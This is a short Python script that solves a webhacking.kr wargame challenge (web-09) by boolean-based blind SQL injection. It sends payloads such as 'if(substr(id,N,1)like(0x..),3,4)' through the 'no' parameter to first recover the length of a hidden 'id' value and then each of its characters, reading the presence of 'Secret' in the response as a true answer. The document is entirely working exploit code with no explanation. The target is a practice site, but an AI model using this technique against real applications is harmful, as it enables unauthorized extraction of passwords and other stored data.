import string
import requests

url = "https://webhacking.kr/challenge/web-09/index.php?"

def pw_length():
    pw_len = 0
    while True:
        pw_len += 1
        payload = "no=if(length(id)like({}),3,4)".format(pw_len)
        print(payload)
        res = requests.get(url=url+payload)
        if "Secret" in res.text:
            print("PASSWORD LENGTH : " + str(pw_len))
            break
    return pw_len

def find_pw(pw_len):
    pw = ""
    for i in range(1,pw_len+1):
        for j in string.printable:
            payload = "no=if(substr(id,{},1)like({}),3,4)".format(i,hex(ord(j)))
            res = requests.get(url=url+payload)
            print(payload)
            if "Secret" in res.text:
                pw += j
                print("FOUND PASSWORD: " + pw)
                break
    print("PASSWORD: " + pw)

if __name__ == "__main__":
    pw_len = pw_length()
    find_pw(pw_len)